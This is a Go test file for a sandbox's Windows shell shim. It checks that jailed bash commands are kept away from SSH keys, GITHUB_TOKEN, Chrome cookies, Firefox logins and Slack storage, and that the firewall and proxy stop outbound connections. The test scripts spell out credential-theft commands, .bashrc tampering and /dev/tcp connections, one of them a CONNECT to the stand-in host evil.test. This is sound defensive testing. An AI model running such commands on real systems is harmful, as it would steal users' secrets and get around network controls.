package main

import (
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"golang.org/x/sys/windows"

	"github.com/GolemTeam/golem-team-shield/shield"
)

func TestSkipArg0ReadsTheProgramNameAsTheCRuntimeDoes(t *testing.T) {
	for in, want := range map[string]string{
		`"C:\Users\x\.golem\bin\bash.exe" -c "echo hi"`: ` -c "echo hi"`,
		`bash.exe -c ls`: ` -c ls`,
		`bash.exe`:       ``,
		`"unterminated`:  ``,
	} {
		if got := skipArg0(in); got != want {
			t.Errorf("%q: got %q, want %q", in, got, want)
		}
	}
}

const testKey = "-----BEGIN OPENSSH PRIVATE KEY-----\nPRIVATE\n-----END OPENSSH PRIVATE KEY-----\n"

func gitBash(t *testing.T) string {
	t.Helper()
	bash := realShell("golem-bash.exe")
	if _, err := os.Stat(bash); err != nil {
		t.Skip("no Git for Windows bash here")
	}
	return bash
}

func TestWindowsShimKeepsTheKeyAndTokenFromTheCommand(t *testing.T) {
	bash := gitBash(t)
	w := newFakeWitness(t, shield.Policy{Enforce: true, State: shield.Clean, Grants: shield.AllGrants()})
	s, stdout, _ := testShim(t, w.URL)
	key := filepath.Join(s.home, ".ssh", "id_ed25519")
	if err := os.MkdirAll(filepath.Dir(key), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(key, []byte(testKey), 0o600); err != nil {
		t.Fatal(err)
	}
	s.env = append(s.env, "SYSTEMROOT="+os.Getenv("SYSTEMROOT"))
	code := s.run(bash, []string{"-c", `cat "$HOME/.ssh/id_ed25519" && echo LEAKED; echo "token=[$GITHUB_TOKEN]"; echo x >> "$HOME/.bashrc" && echo RC; exit 3`})
	out := stdout.String()
	if code != 3 {
		t.Fatalf("exit %d: %s", code, out)
	}
	if strings.Contains(out, "PRIVATE") || strings.Contains(out, "LEAKED") || strings.Contains(out, "RC") {
		t.Errorf("the jail didn't hold: %s", out)
	}
	if !strings.Contains(out, "token=[]") {
		t.Errorf("GITHUB_TOKEN reached the command: %s", out)
	}
	if b, err := os.ReadFile(key); err != nil || !strings.Contains(string(b), "PRIVATE") {
		t.Errorf("the user lost their own key: %v", err)
	}
	if len(w.runs) != 1 || w.runs[0].Jail != shield.JailToken {
		t.Errorf("runs %+v", w.runs)
	}
}

func TestWindowsLockedDownSessionRunsNothing(t *testing.T) {
	bash := gitBash(t)
	w := newFakeWitness(t, shield.Policy{Enforce: true, State: shield.Tainted})
	s, stdout, _ := testShim(t, w.URL)
	if code := s.run(bash, []string{"-c", "echo RAN"}); code != 126 || strings.Contains(stdout.String(), "RAN") {
		t.Fatalf("exit %d: %s", code, stdout.String())
	}
}

func TestWindowsShimKeepsBrowserAndChatStoresFromTheCommand(t *testing.T) {
	bash := gitBash(t)
	w := newFakeWitness(t, shield.Policy{Enforce: true, State: shield.Clean, Grants: shield.AllGrants()})
	s, stdout, _ := testShim(t, w.URL)
	for _, f := range []string{
		`AppData\Local\Google\Chrome\User Data\Default\Cookies`,
		`AppData\Roaming\Mozilla\Firefox\Profiles\x\logins.json`,
		`AppData\Roaming\Slack\storage\x`,
	} {
		p := filepath.Join(s.home, f)
		if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte("SECRET\n"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	s.env = append(s.env, "SYSTEMROOT="+os.Getenv("SYSTEMROOT"))
	code := s.run(bash, []string{"-c", `cd "$HOME/AppData"; cat "Local/Google/Chrome/User Data/Default/Cookies" Roaming/Mozilla/Firefox/Profiles/x/logins.json Roaming/Slack/storage/x; echo x > Roaming/Slack/storage/x && echo PLANTED; echo done`})
	out := stdout.String()
	if strings.Contains(out, "SECRET") || strings.Contains(out, "PLANTED") || !strings.Contains(out, "done") || code != 0 {
		t.Errorf("exit %d, an app's store was reachable: %s", code, out)
	}
}

func TestWindowsWorkspaceWritesStayInTheProject(t *testing.T) {
	bash := gitBash(t)
	w := newFakeWitness(t, shield.Policy{Enforce: true, State: shield.Clean, Grants: shield.AllGrants(), Writes: shield.WritesWorkspace})
	s, stdout, stderr := testShim(t, w.URL)
	s.cwd = filepath.Join(s.cwd, "repo")
	temp := t.TempDir()
	for _, d := range []string{filepath.Join(s.cwd, ".git"), s.home} {
		if err := os.MkdirAll(d, 0o700); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.WriteFile(filepath.Join(s.home, "notes"), []byte("NOTES\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Chdir(s.cwd)
	s.env = append(s.env, "SYSTEMROOT="+os.Getenv("SYSTEMROOT"), "TEMP="+temp, "TMP="+temp)
	script := `echo x > ws.txt && echo WS; echo x > "$TEMP/t" && echo TMP; cat "$HOME/notes"; echo x >> "$HOME/notes" && echo HOMEWRITE; exit 0`
	code := s.run(bash, []string{"-c", script})
	out := stdout.String()
	if code != 0 || !strings.Contains(out, "WS") || !strings.Contains(out, "TMP") || !strings.Contains(out, "NOTES") {
		t.Fatalf("exit %d: the project, temp or a read failed at low integrity: %s / %s", code, out, stderr.String())
	}
	if strings.Contains(out, "HOMEWRITE") {
		t.Errorf("a write left the project: %s", out)
	}
	if len(w.runs) != 1 || w.runs[0].Writes != "workspace" {
		t.Errorf("runs %+v", w.runs)
	}
}

func TestWindowsFirewallHoldsOnlyAnAllowlistedShell(t *testing.T) {
	bash := gitBash(t)
	if !windows.GetCurrentProcessToken().IsElevated() {
		t.Skip("installing the firewall filters needs administrator rights")
	}
	if err := shield.InstallFirewall(); err != nil {
		t.Fatalf("install: %v", err)
	}
	t.Cleanup(func() {
		if err := shield.RemoveFirewall(); err != nil {
			t.Errorf("remove: %v", err)
		}
	})
	if on, err := shield.FirewallInstalled(); err != nil || !on {
		t.Fatalf("installed: %v %v", on, err)
	}
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			c.Close()
		}
	}()
	other := strconv.Itoa(ln.Addr().(*net.TCPAddr).Port)
	for _, addr := range []string{"127.0.0.1:" + other, "github.com:443"} {
		c, err := net.DialTimeout("tcp", addr, 10*time.Second)
		if err != nil {
			t.Fatalf("an unjailed process lost %s to the filters: %v", addr, err)
		}
		c.Close()
	}

	script := `(exec 3<>/dev/tcp/127.0.0.1/` + other + `) 2>/dev/null && echo DIRECT;` +
		` (exec 3<>/dev/tcp/github.com/443) 2>/dev/null && echo PUBLIC;` +
		` echo "proxy=[$https_proxy]"; p=${https_proxy##*:}; if [ -n "$p" ]; then exec 3<>/dev/tcp/127.0.0.1/$p || echo CONNFAIL; printf 'CONNECT evil.test:443 HTTP/1.1\r\nHost: evil.test\r\n\r\n' >&3 && head -1 <&3; fi; exit 0`
	run := func(p shield.Policy) (string, shield.RunRecord) {
		w := newFakeWitness(t, p)
		s, stdout, stderr := testShim(t, w.URL)
		t.Cleanup(func() {
			if t.Failed() {
				t.Logf("stdout %q stderr %q", stdout.String(), stderr.String())
			}
		})
		s.env = append(s.env, "SYSTEMROOT="+os.Getenv("SYSTEMROOT"))
		s.run(bash, []string{"-c", script})
		if len(w.runs) != 1 {
			t.Fatalf("runs %d", len(w.runs))
		}
		return stdout.String(), w.runs[0]
	}
	out, rec := run(shield.Policy{Enforce: true, State: shield.Clean, Grants: shield.AllGrants(),
		Network: shield.NetworkAllowlist, AllowedHosts: []string{"github.com"}})
	if strings.Contains(out, "DIRECT") || strings.Contains(out, "PUBLIC") {
		t.Errorf("an allowlisted shell went around the proxy: %s", out)
	}
	if !strings.Contains(out, "403") {
		t.Errorf("the proxy wasn't reachable: %s", out)
	}
	if rec.Net != shield.NetFirewall {
		t.Errorf("net %q", rec.Net)
	}
	out, _ = run(shield.Policy{Enforce: true, State: shield.Clean, Grants: shield.AllGrants()})
	if !strings.Contains(out, "DIRECT") || !strings.Contains(out, "PUBLIC") {
		t.Errorf("the filters held a shell whose network is open: %s", out)
	}
	out, rec = run(shield.Policy{Enforce: true, State: shield.Clean, Grants: shield.AllGrants(), Writes: shield.WritesWorkspace})
	if rec.Writes != "workspace" || !strings.Contains(out, "DIRECT") || !strings.Contains(out, "PUBLIC") {
		t.Errorf("the filters held a low-integrity process they don't mark (writes %q): %s", rec.Writes, out)
	}
}
